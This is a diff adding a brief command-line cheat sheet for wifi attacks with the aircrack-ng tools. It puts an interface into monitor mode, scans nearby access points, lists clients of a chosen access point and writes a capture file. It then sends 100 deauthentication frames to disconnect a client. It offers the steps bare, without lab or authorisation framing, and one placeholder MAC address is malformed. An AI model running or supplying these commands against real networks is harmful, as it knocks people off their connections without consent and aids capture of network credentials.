@@ -1,0 +1,32 @@
+Check wifi interface address
+ $ ifconfig (assuming your interface name is wlp2s0) 
+ 
+Check if monitor mode is supported by WiFi interface
+ $ airmon-ng start wlp2s0
+ 
+Turn off wifi
+ $ ifconfig wlp2s0 down 
+ 
+Start monitor mode
+ $ iwconfig wlp2s0 mode monitor 
+ 
+Check wifi mode status
+ $ iwconfig 
+ 
+Turn on wifi
+ $ ifconfig wlp2s0 up 
+ 
+Check for wifi access points visible near you
+ $ airodump-ng wlp2s0 
+ 
+Check active clients connected to BSSID (wifi access point)
+ $ airodump-ng wlp2s0 --bssid 00:00:00:00:00:00 --channel 4 --write details.txt 
+ 
+MAC ADDRESS OF WIFI -c CLIENT CONNECTED TO IT (deauth)
+ $ aireplay-ng --deauth 100 -a 00:00:00:00:00:0 -c 00:00:00:00:00:00 wlp2s0 
+ 
+Turn off wifi
+ $ ifconfig wlp2s0 down 
+ 
+Enable managed mode
+ $ iwconfig wlp2s0 mode managed 
